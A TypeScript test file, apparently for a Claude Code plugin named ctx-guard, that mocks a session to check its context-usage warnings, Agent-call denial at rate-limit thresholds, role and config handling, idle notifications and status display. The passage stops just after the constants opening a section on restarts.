import { expect, mock, test } from 'claude-code/testing'
import type { Engine, MockClock, MockSession, Plugin } from 'claude-code/testing'
import type { On } from 'claude-code'

const NOW = Date.parse('2026-10-13T12:00:00Z')
const ROOT = '/repo'
const TEAM = `${ROOT}/.claude/ctx-guard.json`
const LOCAL = `${ROOT}/.claude/ctx-guard.local.json`
const GITIGNORE = `${ROOT}/.gitignore`
const WINDOW = 1_000_000
const HOUR = 60 * 60 * 1000

type Limit = { kind: string; percentUsed: number; resetsAt?: string }

// The world beneath the plugin: files in memory, the session's figures, the
// commands it lists, and what the plugin showed.
type World = {
  files: Record<string, { text: string; mtimeMs: number }>
  tokens: number | undefined
  limits: Limit[]
  commands: { name: string; source: 'builtin' | 'plugin' | 'user' | 'mcp'; plugin?: string }[]
  registered: string[]
  toasts: string[]
  statuses: (string | undefined)[]
  version: string
  notifies: string[]
  failUsage: boolean
  sessionId: string
  agents: { id: string; status: string; description: string; type: string }[]
  failAgentList: boolean
  agentListCalls: number
  // How long the list takes to answer.
  listHang: number
  // Every command a plugin ran, `name args`, and how the bottom answers them.
  ran: string[]
  failCommand: string | null
  // How long the bottom holds a command before answering it, by name.
  hang: Record<string, number>
  processes: string[][]
  exitCode: number | 'timeout'
  // path → where it really lands (a symlink); absent means the path itself.
  links: Record<string, string>
  onWrite?: (path: string) => void
  // Runs as a ready check runs: what another session does meanwhile.
  onProcess?: () => void
  // The engine's compaction window, answered with a breakdown; null answers none.
  rawMax: number | null
  window: number
  clock?: MockClock
}

function newWorld(over: Partial<World> = {}): World {
  return {
    files: {},
    tokens: 100_000,
    limits: [],
    commands: [],
    registered: [],
    toasts: [],
    statuses: [],
    version: '2.1.296',
    notifies: [],
    failUsage: false,
    sessionId: 's1',
    agents: [],
    failAgentList: false,
    agentListCalls: 0,
    listHang: 0,
    ran: [],
    failCommand: null,
    hang: {},
    processes: [],
    exitCode: 0,
    links: {},
    rawMax: null,
    window: WINDOW,
    ...over,
  }
}

function usageOf(w: World) {
  return {
    startedAt: NOW,
    context: w.tokens === undefined ? { window: w.window } : { window: w.window, tokens: w.tokens, percent: Math.round((w.tokens / w.window) * 100) },
    rateLimits: w.limits,
  }
}

function dirsOf(w: World): Set<string> {
  const dirs = new Set<string>([ROOT])
  for (const path of Object.keys(w.files)) {
    const parts = path.split('/')
    for (let i = 2; i < parts.length; i++) dirs.add(parts.slice(0, i).join('/'))
  }
  return dirs
}

function world(on: On, w: World, env: Record<string, string> = {}): { clock: MockClock; session: MockSession } {
  const session = mock.session(on)
  mock.env(on, env)
  mock.store(on)
  const clock = mock.clock(on, { now: NOW })
  w.clock = clock
  on('session.start', ($, e) => ({ cwd: e.cwd }))
  on('session.end', ($, e) => ({ sessionId: e.sessionId }))
  on('session.measure', ($, e) => ({ changed: e.changed }))
  on('turn.start', ($, e) => ({ turnId: e.turnId }))
  on('turn.complete', ($, e) => ({ text: e.answer }))
  on('session.root', () => ({ value: ROOT }))
  on('session.surfaces', () => ({ value: ['terminal'] as const }))
  on('session.usage', ($, e) => {
    if (w.failUsage) throw new Error('usage unavailable')
    const u = usageOf(w)
    if (!e?.breakdown || w.rawMax === null) return { value: u }
    const breakdown = { rawMaxTokens: w.rawMax, autocompactSource: 'settings' } as never
    return { value: { ...u, context: { ...u.context, breakdown } } }
  })
  on('session.version', () => ({ value: { version: w.version, base: w.version } }))
  on('settings.read', () => ({ value: {} }))
  on('command.list', () => ({ value: w.commands.map(c => ({ description: '', ...c })) }))
  on('command.register', ($, e) => {
    w.registered.push(e.name)
    return { value: { command: e.name } }
  })
  on('ui.toast', ($, e) => {
    w.toasts.push(e.text)
    return { value: undefined }
  })
  on('ui.status', ($, e) => {
    w.statuses.push(e.text)
    return { value: undefined }
  })
  on('ui.notify', ($, e) => {
    w.notifies.push(e.text)
    return { value: { isSent: true, channel: 'terminal_bell' } as never }
  })
  on('fs.stat', ($, e) => {
    const f = w.files[e.path]
    const isDir = dirsOf(w).has(e.path) || e.path in w.links
    if (!f && !isDir) throw new Error(`ENOENT: ${e.path}`)
    const link = w.links[e.path]
    const kind = f ? ('file' as const) : ('dir' as const)
    return { value: { kind, size: f?.text.length ?? 0, mtimeMs: f?.mtimeMs ?? 0, isLink: link !== undefined, ...(e.resolve ? { realPath: link ?? e.path } : {}) } }
  })
  on('fs.list', ($, e) => {
    const dirs = dirsOf(w)
    if (!dirs.has(e.path)) throw new Error(`ENOENT: ${e.path}`)
    const names = new Set<string>()
    for (const p of [...Object.keys(w.files), ...dirs]) if (p.startsWith(`${e.path}/`)) names.add(p.slice(e.path.length + 1).split('/')[0] ?? '')
    return {
      value: [...names].map(name => {
        const path = `${e.path}/${name}`
        const isDir = dirs.has(path)
        return { name, kind: isDir ? ('dir' as const) : ('file' as const), size: 0, mtimeMs: isDir ? 0 : (w.files[path]?.mtimeMs ?? 0), isLink: false }
      }),
    }
  })
  on('session.id', () => ({ value: w.sessionId }))
  on('agent.list', async () => {
    w.agentListCalls += 1
    if (w.listHang > 0) await clock.sleep(w.listHang)
    if (w.failAgentList) throw new Error('agent list unavailable')
    return { value: w.agents as never }
  })
  on('command.run', async ($, e) => {
    // Reached only when ctx-guard is inert and another plugin owns /ctx-guard.
    if (e.command === 'ctx-guard') return { text: 'the other plugin' }
    w.ran.push(e.args ? `${e.command} ${e.args}` : e.command)
    const hold = w.hang[e.command] ?? 0
    if (hold > 0) await clock.sleep(hold)
    if (w.failCommand === e.command) throw new Error(`${e.command} refused`)
    return { text: '' }
  })
  on('process.run', ($, e) => {
    w.processes.push([...e.argv])
    w.onProcess?.()
    if (w.exitCode === 'timeout') throw new Error('timed out')
    return { value: { exitCode: w.exitCode, stdout: '', stderr: '', isStdoutTruncated: false, isStderrTruncated: false } }
  })
  on('fs.exists', ($, e) => ({ value: e.path in w.files || dirsOf(w).has(e.path) || e.path in w.links }))
  on('classic.Stop', () => ({}))
  on('fs.read', ($, e) => {
    const f = w.files[e.path]
    if (!f) throw new Error(`ENOENT: ${e.path}`)
    return { value: f.text as never }
  })
  on('fs.write', ($, e) => {
    w.files[e.path] = { text: e.text, mtimeMs: clock.now() }
    w.onWrite?.(e.path)
    return { value: undefined }
  })
  on('tool.call', () => ({ result: 'ran' as never }))
  // The started agent's id is the spawn's description.
  on('agent.spawn', ($, e) => ({ model: 'm', agentId: e.description }))
  return { clock, session }
}

function writeConfig(w: World, value: unknown, path = TEAM): void {
  w.files[path] = { text: typeof value === 'string' ? value : JSON.stringify(value), mtimeMs: (w.clock?.now() ?? NOW) + Math.random() }
}

async function start($: Engine, surface: 'terminal' | 'vscode' | null = 'terminal', isInteractive = true): Promise<void> {
  await $.session.start({ cwd: ROOT, surface, isInteractive })
}

async function measure($: Engine, w: World, tokens: number | undefined): Promise<void> {
  w.tokens = tokens
  const u = usageOf(w)
  await $.session.measure({ context: u.context, rateLimits: u.rateLimits, changed: ['context'] })
}

// One model request; the step bottom answers its usage. The evaluation runs
// off the step's path, so the clock settles it.
async function step($: Engine, clock: MockClock, agentId?: string): Promise<void> {
  const s = $.turn.step({ turnId: 't1', index: 0, model: 'm', messageCount: 3, ...(agentId ? { agentId } : {}) })
  for await (const _ of s) {
    // drain
  }
  await s.result
  await clock.settle()
}

async function ctxGuard($: Engine, args: string, kind: 'composer' | 'plugin' = 'composer'): Promise<string> {
  const r = await $.command.run({ command: 'ctx-guard', args, origin: { kind } as never, presentation: { isFullscreen: false, columns: 120 } })
  return r.text ?? ''
}

const notes = (s: MockSession): string[] =>
  s
    .appended()
    .filter(r => r.door === 'note')
    .map(r => JSON.stringify(r.message.content))

// A second plugin that reads ctx-guard's $.state (any plugin may read it), so a
// test can look at what survives a reload.
const PEEK: Plugin = {
  name: 'peek',
  register: on => {
    on('command.run', { command: 'peek' }, async $ => {
      const marks = (await $.state.get({ plugin: 'ctx-guard', key: 'marks' })).value ?? null
      const roleClaim = (await $.state.get({ plugin: 'ctx-guard', key: 'roleClaim' })).value ?? null
      return { text: JSON.stringify({ marks, roleClaim }) }
    })
  },
}

async function peek($: Engine): Promise<{ marks: { byId: Record<string, { step: number }> } | null; roleClaim: { role: string | null } | null }> {
  const r = await $.command.run({ command: 'peek', args: '', origin: { kind: 'composer' } as never, presentation: { isFullscreen: false, columns: 120 } })
  return JSON.parse(r.text ?? 'null')
}

const AGENT = { tool: 'Agent', description: 'probe', prompt: 'Reply OK', subagent_type: 'general-purpose' } as const

// The deny reason of an Agent call, or undefined when it ran.
async function agentDenied($: Engine): Promise<string | undefined> {
  const r = await $.tool.call(AGENT)
  if (r.deny !== undefined) return r.deny
  expect(r.result).toBe('ran')
  return undefined
}

const LEAD_SOFT = {
  version: 1,
  roles: { lead: { triggers: [{ id: 'soft', when: { context: '300k' }, do: ['note'], level: 'soft' }] } },
}

const LEAD_BRAKE = {
  version: 1,
  roles: { lead: { triggers: [{ id: 'brake', when: { 'limit.any': 90 }, do: [{ deny: ['Agent'] }], level: 'stop' }] } },
}

// The step bottom answers with the usage the test sets per call.
function stepBottom(on: On, tokens: () => number, model: () => string = () => 'm'): void {
  on('turn.step', async function* ($, e) {
    const t = tokens()
    return {
      turnId: e.turnId,
      index: e.index,
      answer: '',
      toolUses: [],
      stopReason: 'end_turn' as never,
      usage: { input_tokens: 10, cache_read_input_tokens: t - 10, cache_creation_input_tokens: 0, output_tokens: 50, model: model() },
    }
  })
}

test('zero-config: toasts past 50% context, never a note', async ($, on) => {
  const w = newWorld({ tokens: 100_000 })
  const { session } = world(on, w)
  await start($)
  await measure($, w, 600_000)
  expect(w.toasts.some(t => t.includes('context 600k (60% of 1M)'))).toBe(true)
  expect(notes(session)).toEqual([])
  expect(w.registered).toEqual(['ctx-guard'])
})

test('role from env: one note on the rising edge, none while held', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await measure($, w, 250_000)
  expect(notes(session)).toEqual([])
  await measure($, w, 310_000)
  await measure($, w, 320_000)
  const sent = notes(session)
  expect(sent.length).toBe(1)
  expect(sent[0]).toContain('[ctx-guard] Context is at 310k')
})

test('a main-loop step past the threshold notes mid-turn; a subagent step does not', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  let stepTokens = 310_000
  stepBottom(on, () => stepTokens)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock, 'sub-1')
  expect(notes(session)).toEqual([])
  await step($, clock)
  expect(notes(session).length).toBe(1)
  expect(notes(session)[0]).toContain('Context is at 310k')
  stepTokens = 330_000
  await step($, clock)
  expect(notes(session).length).toBe(1)
  // The step's fill is newer than usage() (still 100k): a tick must not drop the mark.
  await clock.advance(60 * 1000)
  stepTokens = 340_000
  await step($, clock)
  expect(notes(session).length).toBe(1)
})

test('marks survive a reload: no second note for the same crossing', { plugins: [PEEK] }, async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await measure($, w, 310_000)
  expect(notes(session).length).toBe(1)
  // A hot reload fires session.start again with module state rebuilt.
  const marks = (await peek($)).marks
  expect(marks?.byId.soft?.step).toBe(0)
  await start($)
  expect((await peek($)).marks).toEqual(marks)
  await measure($, w, 320_000)
  expect(notes(session).length).toBe(1)
})

test('/clear re-arms every trigger', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await measure($, w, 310_000)
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  await measure($, w, undefined)
  expect(notes(session).length).toBe(1)
  await measure($, w, 310_000)
  expect(notes(session).length).toBe(2)
  expect(await ctxGuard($, '')).toContain('last /clear: 0s ago')
})

test('Agent is denied past the threshold with blocking on', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95, resetsAt: new Date(NOW + 2 * HOUR).toISOString() }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  const reason = await agentDenied($)
  expect(reason).toContain('[ctx-guard] Agent is blocked by trigger "brake"')
  expect(reason).toContain('resets (in 2h)')
  const bash = await $.tool.call({ tool: 'Bash', command: 'true' } as never)
  expect(bash.deny).toBeUndefined()
  expect(bash.result).toBe('ran')
})

test('Agent passes below the threshold', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 50 }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await agentDenied($)).toBeUndefined()
})

test('with blocking off the same call passes', { options: { blocking: false } }, async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await agentDenied($)).toBeUndefined()
})

test('a pause lifts the deny until it ends or is lifted', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await ctxGuard($, 'pause 10m')).toContain('paused for 10m')
  expect(await agentDenied($)).toBeUndefined()
  await clock.advance(11 * 60 * 1000)
  expect(await agentDenied($)).toContain('Agent is blocked')
  await ctxGuard($, 'pause')
  expect(await agentDenied($)).toBeUndefined()
  expect(await ctxGuard($, 'pause off')).toContain('pause lifted')
  expect(await agentDenied($)).toContain('Agent is blocked')
})

test('no role, no deny', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w)
  await start($)
  expect(await agentDenied($)).toBeUndefined()
})

test('an invalid file lists its errors, toasts once and keeps the last good config', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await clock.advance(1000)
  writeConfig(w, '{ "version": 1, "roles": ')
  await measure($, w, 200_000)
  await measure($, w, 210_000)
  const errorToasts = w.toasts.filter(t => t.includes('config has 1 error'))
  expect(errorToasts.length).toBe(1)
  expect(errorToasts[0]).toContain('kept the last good config')
  const report = await ctxGuard($, '')
  expect(report).toContain('config: last-good')
  expect(report).toContain('error: .claude/ctx-guard.json: invalid JSON')
  expect(report).toContain('role: lead (from CTX_GUARD_ROLE)')
  await measure($, w, 310_000)
  expect(notes(session).length).toBe(1)
})

test('an invalid file with nothing good before runs the built-ins', async ($, on) => {
  const w = newWorld()
  writeConfig(w, { version: 1, roles: { lead: { triggers: 'nope' } } })
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(w.toasts.some(t => t.includes('running on the built-in config'))).toBe(true)
  const report = await ctxGuard($, '')
  expect(report).toContain('config: built-in')
  expect(report).toContain('not in the config')
})

test('an mtime change reloads the config at the next measure', async ($, on) => {
  const w = newWorld()
  writeConfig(w, { version: 1, roles: { lead: { triggers: [{ id: 'soft', when: { context: '500k' }, do: ['note'] }] } } })
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await measure($, w, 310_000)
  expect(notes(session)).toEqual([])
  await clock.advance(1000)
  writeConfig(w, LEAD_SOFT)
  await measure($, w, 310_000)
  expect(notes(session).length).toBe(1)
})

test('the local file overrides the team file', async ($, on) => {
  const w = newWorld()
  writeConfig(w, { version: 1, roles: { lead: { triggers: [{ id: 'soft', when: { context: '500k' }, do: ['note'] }] } } })
  writeConfig(w, LEAD_SOFT, LOCAL)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await measure($, w, 310_000)
  expect(notes(session).length).toBe(1)
})

test('/ctx-guard role from the composer sets the claim, which survives a reload', { plugins: [PEEK] }, async ($, on) => {
  const w = newWorld({ tokens: 312_000, limits: [{ kind: 'five_hour', percentUsed: 42 }] })
  writeConfig(w, { version: 1, roles: { lead: {}, reviewer: {} } })
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'vscode')
  expect(await ctxGuard($, 'role reviewer')).toContain('role is now reviewer')
  expect(w.statuses.at(-1)).toBe('reviewer · 312k (31%) · 5h 42%')
  await start($, 'vscode')
  expect((await peek($)).roleClaim?.role).toBe('reviewer')
  expect(await ctxGuard($, '')).toContain('role: reviewer (from /ctx-guard role)')
  expect(await ctxGuard($, 'role none')).toContain('role is now none')
  expect(await ctxGuard($, '')).toContain('role: none (from /ctx-guard role)')
})

test('/ctx-guard role from a plugin or an unknown role changes nothing', async ($, on) => {
  const w = newWorld()
  writeConfig(w, { version: 1, roles: { lead: {}, reviewer: {} } })
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await ctxGuard($, 'role reviewer', 'plugin')).toContain('ask the operator')
  expect(await ctxGuard($, 'role ghost')).toContain('not in the config')
  expect(await ctxGuard($, '')).toContain('role: lead (from CTX_GUARD_ROLE)')
})

test('an unknown env role toasts once and runs with no role', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'ghost' })
  await start($)
  await start($)
  expect(w.toasts.filter(t => t.includes('role "ghost"')).length).toBe(1)
  await measure($, w, 310_000)
  expect(notes(session)).toEqual([])
})

test('a non-interactive session gets no role and no note', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, null, false)
  await measure($, w, 310_000)
  expect(notes(session)).toEqual([])
})

test('init writes the starter once, never overwrites, and adds .gitignore lines', async ($, on) => {
  const w = newWorld()
  w.files[GITIGNORE] = { text: 'node_modules/', mtimeMs: NOW }
  world(on, w)
  await start($)
  expect(await ctxGuard($, 'init')).toContain('wrote .claude/ctx-guard.json (solo starter)')
  const written = w.files[TEAM]?.text ?? ''
  expect(JSON.parse(written).defaultRole).toBe('main')
  expect(w.files[GITIGNORE]?.text).toBe('node_modules/\n.claude/ctx-guard.local.json\n.ctx-guard/\n')
  expect(await ctxGuard($, '')).toContain('role: main (from project defaultRole)')

  const again = await ctxGuard($, 'init peers')
  expect(again).toContain('exists; left as it is')
  expect(again).toContain('.gitignore already lists')
  expect(w.files[TEAM]?.text).toBe(written)
  expect(w.files[GITIGNORE]?.text).toBe('node_modules/\n.claude/ctx-guard.local.json\n.ctx-guard/\n')
})

test('init peers writes two peer roles and a fresh .gitignore', async ($, on) => {
  const w = newWorld()
  world(on, w)
  await start($)
  await ctxGuard($, 'init peers')
  expect(Object.keys(JSON.parse(w.files[TEAM]?.text ?? '{}').roles)).toEqual(['lead', 'reviewer'])
  expect(w.files[GITIGNORE]?.text).toBe('.claude/ctx-guard.local.json\n.ctx-guard/\n')
  expect(await ctxGuard($, '')).not.toContain('error:')
})

test('unknown subcommands answer with the usage', async ($, on) => {
  const w = newWorld()
  world(on, w)
  await start($)
  const text = await ctxGuard($, 'frobnicate')
  expect(text).toContain('unknown subcommand "frobnicate"')
  expect(text).toContain('Usage:')
})

test('another plugin owning /ctx-guard leaves ctx-guard inert', async ($, on) => {
  const w = newWorld({ commands: [{ name: 'ctx-guard', source: 'plugin', plugin: 'someone-else' }] })
  writeConfig(w, LEAD_SOFT)
  const { session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await start($)
  expect(w.toasts.filter(t => t.includes('/ctx-guard already belongs to the someone-else plugin')).length).toBe(1)
  expect(w.registered).toEqual([])
  await measure($, w, 310_000)
  expect(notes(session)).toEqual([])
  expect(await ctxGuard($, '')).toBe('the other plugin')
})

test('an old engine gets one toast', async ($, on) => {
  const w = newWorld({ version: '2.1.280' })
  world(on, w)
  await start($)
  await start($)
  expect(w.toasts.filter(t => t.includes('needs Claude Code 2.1.293')).length).toBe(1)
})

test('enabled false: no band, no toasts, no denies', { options: { enabled: false } }, async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'vscode')
  await measure($, w, 900_000)
  expect(w.toasts).toEqual([])
  expect(w.statuses.filter(s => s !== undefined)).toEqual([])
  expect(await agentDenied($)).toBeUndefined()
  expect(await ctxGuard($, '')).toContain('ctx-guard: off')
})

test('the band text on the status line where no band is drawn', async ($, on) => {
  const w = newWorld({
    tokens: 312_000,
    limits: [
      { kind: 'five_hour', percentUsed: 42, resetsAt: new Date(NOW + 2 * HOUR + 10 * 60 * 1000).toISOString() },
      { kind: 'seven_day', percentUsed: 95, resetsAt: new Date(NOW + 76 * HOUR).toISOString() },
    ],
  })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'vscode')
  expect(w.statuses.at(-1)).toBe('lead · 312k (31%) · 5h 42% (2h10m) · wk 95% (3d4h) · deny Agent')
})

test('display status writes the status line on the terminal too', { options: { display: 'status' } }, async ($, on) => {
  const w = newWorld({ tokens: 50_000 })
  world(on, w)
  await start($, 'terminal')
  expect(w.statuses.at(-1)).toBe('50k (5%)')
})

test('the band draws above the prompt on the terminal and desktop', async ($, on) => {
  const w = newWorld({ tokens: 312_000, limits: [{ kind: 'five_hour', percentUsed: 42 }] })
  writeConfig(w, LEAD_SOFT)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'terminal')
  expect(w.statuses).toEqual([undefined])
  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await $.ui.mount({
      plugin: 'ctx-guard',
      surface,
      component: 'AbovePrompt',
      props: { hasSurvey: false, isWorking: false } as never,
    })
    expect((await ui.findAll({ type: 'Text', text: 'lead' })).length).toBeGreaterThan(0)
    expect((await ui.findAll({ type: 'Text', text: '312k (31%)' })).length).toBeGreaterThan(0)
    expect((await ui.findAll({ type: 'Text', text: '5h 42%' })).length).toBeGreaterThan(0)
  }
})

const IDLE_ROLE = {
  version: 1,
  roles: { lead: { triggers: [{ id: 'idle', when: { idle: '5m' }, do: ['notify'] }] } },
}

async function turn($: Engine, phase: 'start' | 'end'): Promise<void> {
  if (phase === 'start') await $.turn.start({ text: 'go', turnId: 't1' })
  else await $.turn.complete({ answer: 'done', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
}

test('the idle timer notifies once the session sits idle', async ($, on) => {
  const w = newWorld()
  writeConfig(w, IDLE_ROLE)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await turn($, 'start')
  await turn($, 'end')
  await clock.advance(4 * 60 * 1000)
  expect(w.notifies).toEqual([])
  await clock.advance(2 * 60 * 1000)
  expect(w.notifies.length).toBe(1)
  expect(w.notifies[0]).toContain('idle')
})

test('a running turn is never idle, across a reload too', async ($, on) => {
  const w = newWorld()
  writeConfig(w, IDLE_ROLE)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await turn($, 'start')
  await turn($, 'end')
  await turn($, 'start')
  // A reload mid-turn must not forget the running turn.
  await start($)
  await clock.advance(10 * 60 * 1000)
  expect(w.notifies).toEqual([])
  await turn($, 'end')
  await clock.advance(6 * 60 * 1000)
  expect(w.notifies.length).toBe(1)
})

test('the timers are armed again by a session start, once', async ($, on) => {
  const w = newWorld()
  writeConfig(w, IDLE_ROLE)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await turn($, 'start')
  await turn($, 'end')
  await start($)
  await start($)
  await clock.advance(6 * 60 * 1000)
  expect(w.notifies.length).toBe(1)
})

test('enabling ctx-guard in the config file arms it at the next measure', async ($, on) => {
  const w = newWorld({ tokens: 312_000 })
  writeConfig(w, { version: 1, enabled: false, roles: { lead: {} } })
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'vscode')
  expect(w.statuses.filter(x => x !== undefined)).toEqual([])
  await clock.advance(1000)
  writeConfig(w, { version: 1, roles: { lead: {} } })
  await measure($, w, 312_000)
  expect(w.statuses.at(-1)).toBe('lead · 312k (31%)')
  await clock.advance(1000)
  writeConfig(w, { version: 1, enabled: false, roles: { lead: {} } })
  await measure($, w, 312_000)
  expect(w.statuses.at(-1)).toBeUndefined()
})

test('the band refreshes its countdowns every 5 minutes', async ($, on) => {
  const w = newWorld({ tokens: 312_000, limits: [{ kind: 'five_hour', percentUsed: 42, resetsAt: new Date(NOW + 2 * HOUR + 10 * 60 * 1000).toISOString() }] })
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'main' })
  await start($, 'vscode')
  expect(w.statuses.at(-1)).toBe('main · 312k (31%) · 5h 42% (2h10m)')
  await clock.advance(5 * 60 * 1000)
  expect(w.statuses.at(-1)).toBe('main · 312k (31%) · 5h 42% (2h5m)')
})

test('the engine window counts the percentages and the report names it', async ($, on) => {
  const w = newWorld({ tokens: 312_000, rawMax: 400_000 })
  world(on, w)
  await start($, 'vscode')
  expect(w.statuses.at(-1)).toBe('312k (78%)')
  expect(await ctxGuard($, '')).toContain('contextWindow auto = 400k (engine: settings)')
})

test('a subagent tool call is never denied', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  const r = await $.tool.call({ ...AGENT, agentId: 'sub-1' } as never)
  expect(r.deny).toBeUndefined()
  expect(r.result).toBe('ran')
})

test('the deny fails open when the usage cannot be read', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await agentDenied($)).toContain('Agent is blocked')
  w.failUsage = true
  expect(await agentDenied($)).toBeUndefined()
})

test('a measure and a step racing note once', async ($, on) => {
  const w = newWorld()
  writeConfig(w, LEAD_SOFT)
  stepBottom(on, () => 310_000)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await Promise.all([measure($, w, 310_000), step($, clock), measure($, w, 310_000), step($, clock)])
  await clock.settle()
  expect(notes(session).length).toBe(1)
})

test('pause and init typed by anyone but the operator are refused', async ($, on) => {
  const w = newWorld({ limits: [{ kind: 'five_hour', percentUsed: 95 }] })
  writeConfig(w, LEAD_BRAKE)
  const before = w.files[TEAM]?.text
  world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await ctxGuard($, 'pause 10m', 'plugin')).toContain('only the operator can run /ctx-guard pause')
  expect(await agentDenied($)).toContain('Agent is blocked')
  expect(await ctxGuard($, 'init', 'plugin')).toContain('only the operator can run /ctx-guard init')
  expect(w.files[TEAM]?.text).toBe(before)
  expect(w.files[GITIGNORE]).toBeUndefined()
})

test('a configPath escaping the root is refused; init writes the default path only', { options: { configPath: '../outside.json' } }, async ($, on) => {
  const w = newWorld()
  world(on, w)
  await start($)
  expect(await ctxGuard($, 'init')).toContain('wrote .claude/ctx-guard.json')
  expect(Object.keys(w.files).every(p => p.startsWith(`${ROOT}/`))).toBe(true)
  expect(await ctxGuard($, '')).toContain('error: userConfig: configPath')
})

test('turn ends are kept before ctx-guard has started', async ($, on) => {
  const w = newWorld()
  writeConfig(w, IDLE_ROLE)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await turn($, 'start')
  await turn($, 'end')
  await start($)
  await clock.advance(6 * 60 * 1000)
  expect(w.notifies.length).toBe(1)
})

test('a turn start with no end for hours counts as stale, so idle fires', async ($, on) => {
  const w = newWorld()
  writeConfig(w, IDLE_ROLE)
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await turn($, 'start')
  await turn($, 'end')
  await turn($, 'start')
  await clock.advance(5 * 60 * 60 * 1000)
  expect(w.notifies).toEqual([])
  await clock.advance(61 * 60 * 1000)
  expect(w.notifies.length).toBe(1)
})

test('a new step model re-places percent gates', async ($, on) => {
  const w = newWorld()
  writeConfig(w, { version: 1, roles: { lead: { triggers: [{ id: 'half', when: { context: '50%' }, do: ['note'] }] } } })
  let model = 'big'
  stepBottom(on, () => 310_000, () => model)
  const { session, clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await step($, clock)
  expect(notes(session)).toEqual([])
  // Same tokens on a model with a 600k window: 52%, past the threshold.
  model = 'small'
  w.window = 600_000
  await step($, clock)
  expect(notes(session).length).toBe(1)
})

test('the engine window is read again when the context starts over and every 10th measure', async ($, on) => {
  const w = newWorld({ tokens: 240_000, rawMax: 400_000 })
  world(on, w)
  await start($, 'vscode')
  expect(w.statuses.at(-1)).toBe('240k (60%)')
  w.rawMax = 300_000
  await measure($, w, undefined)
  await measure($, w, 240_000)
  expect(w.statuses.at(-1)).toBe('240k (80%)')
  w.rawMax = 480_000
  for (let i = 0; i < 7; i++) await measure($, w, 240_000)
  expect(w.statuses.at(-1)).toBe('240k (80%)')
  await measure($, w, 240_000)
  expect(w.statuses.at(-1)).toBe('240k (50%)')
})

// ---- restart: ready token → clear + resume ----------------------------------

const MIN = 60 * 1000
const RACE_SETTLE_MS = 1500
const STATE = `${ROOT}/.ctx-guard`
const HANDOFF = `${STATE}/lead-handoff.md`
const RESUME = 'ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md Carry on.'
const RESTART_COMMANDS: World['commands'] = [
  { name: 'clear', source: 'builtin' },
  { name: 'compact', source: 'builtin' },
  { name: 'ctx-guard:resume', source: 'plugin', plugin: 'ctx-guard' },
]

